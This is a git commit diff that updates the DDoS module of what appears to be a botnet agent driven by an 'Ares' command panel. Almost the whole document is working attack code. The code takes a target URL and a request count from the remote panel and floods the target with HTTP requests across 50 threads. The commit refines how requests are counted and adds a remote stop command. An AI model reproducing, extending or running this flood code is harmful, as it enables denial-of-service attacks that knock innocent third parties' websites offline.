dc02f235a041f76b7b95d506124ac5a658eee24c
Wayne Kenney <pythogen@wayne.cool>
2015-12-29 13:13:39 -0500

    Update: Functionality refinement. Clean up syntax.

--- agent/modules/ddos.py
+++ agent/modules/ddos.py
@@ -6,13 +6,15 @@
 
 # 12/27/2015 - 4:42 PM - Update: Functional stop feature now included.
 
-# Panel command:
+# 12/29/2015 - 1:01 PM - Update: Functionality refinement. Clean up syntax.
+
+# Panel commands:
 
 # ddos http://[host]/ [requests]
-
 # ddos http://something.com/ 10000
+# ddos stop 0
 
-# Make sure to include 'ddos' to MODULES array in agent.py
+# Make sure to include 'ddos' in MODULES array in agent.py
 
 
 # - Import Modules -
@@ -45,37 +47,49 @@ def complete():
 
     # Announce completion
     utils.send_output("DDoS Complete.")
-    inc = 0
 
 
 def auto_send_request(server, number_of_requests=10):
     # Globalize increment variable
     global inc
+    global isDos
+
+    # Value for completion notification condition
+    requestsCheck = (requests - 1)
 
     for z in range(number_of_requests):
         try:
+
             # Is it active?
             if isDos == True:
+
+                # HTTP Connection >>
                 urlopen(server)
-                # Successful connection
-                stdout.write(".") # indicated by period
-                # Increment
+
+                # Successful connection [!]
+                stdout.write(".") # indicated by period in console (for debugging)
+
+                # Increment ++
                 inc = inc + 1 # Count total requests sent
-                # When all requests have been sent..
-                if inc == (requests):
-                    # Process complete
-                    complete()
-            # if not active then break
+
+            # if not active then break ..
             elif isDos == False:
                 break
-                
+
         except IOError:
-            # Failed connection
-            stdout.write("E") # indicated by E ('Error')
+            # Failed connection [!]
+            stdout.write("E") # indicated by E in console (for debugging)
 
+        # Request count checking
+        if inc >= requestsCheck:
 
+            # Finished DDoS Session! Call next function
+            complete()
 
-def flood(url, number_of_requests = 1000, number_of_threads = 50):
+                
+
+# Flood routine
+def flood(url, number_of_requests = 1000, number_of_threads = 50):  
     number_of_requests_per_thread = int(number_of_requests/number_of_threads)
     try:
         for x in range(number_of_threads):
@@ -89,13 +103,15 @@ def flood(url, number_of_requests = 1000, number_of_threads = 50):
 
 # - Command control -
 
-def run(action, num_req):
+def run(action, num_req):    
     # Globalize increment and request variables
     global requests
     global inc
     global isDos
+
     # inc initially set to 0
     inc = 0
+
     # isDos boolean
     isDos = False
 
@@ -103,10 +119,12 @@ def run(action, num_req):
     if action != "stop":
         utils.send_output("DDoS Started.")
         
-        # Determines if stresser is active
+        # Boolean value that determines if stresser is active
         isDos = True
+
         # Argument passed from Ares panel
         server = action # Host put in server
+
         # Number of requests
         requests = int(num_req) # Specified number of requests
 
@@ -116,21 +134,22 @@ def run(action, num_req):
 
     # Halt process
     elif action == "stop":
+
         # Turn it off
         isDos = False
         utils.send_output('DDoS Stopped.')
     else:
 
         # Display current commands
-        utils.send_output("Usage: DDoS [host] [requests]|stop")
+        utils.send_output("Usage: DDoS [host] [requests]|stop 0")
 
 
 
 def help():
-    # Some command details
+    # Help command details
     help_text = """
-    Usage: ddos [host] [requests]|stop
-    Starts HTTP DDoS.
+    Usage: ddos [host] [requests]|stop 0
+    HTTP-DDoS.
 
     """
     return help_text
